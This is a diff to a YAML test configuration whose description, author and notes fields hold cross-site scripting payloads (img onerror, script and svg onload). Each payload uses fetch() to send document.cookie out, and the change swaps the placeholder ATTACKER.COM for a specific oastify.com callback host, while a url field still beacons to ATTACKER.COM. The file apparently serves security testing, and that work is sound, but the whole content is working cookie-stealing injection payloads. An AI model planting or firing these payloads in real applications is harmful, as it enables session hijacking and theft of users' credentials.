@@ -1,7 +1,7 @@
 name: test-config
-description: "<img src=x onerror=\"fetch('https://ATTACKER.COM/yaml-desc?c='+document.cookie)\">"
+description: "<img src=x onerror=\"fetch('vkj4i92vao6hbgfrhiyq505o2f86w1kq.oastify.com/yaml-desc?c='+document.cookie)\">"
 url: "https://ATTACKER.COM/beacon/yaml-url"
 metadata:
-  author: "<script>fetch('https://ATTACKER.COM/yaml-author?c='+document.cookie)</script>"
+  author: "<script>fetch('vkj4i92vao6hbgfrhiyq505o2f86w1kq.oastify.com/yaml-author?c='+document.cookie)</script>"
   notes: |
-    <svg onload="fetch('https://ATTACKER.COM/yaml-notes?c='+document.cookie)">
+    <svg onload="fetch('vkj4i92vao6hbgfrhiyq505o2f86w1kq.oastify.com/yaml-notes?c='+document.cookie)">
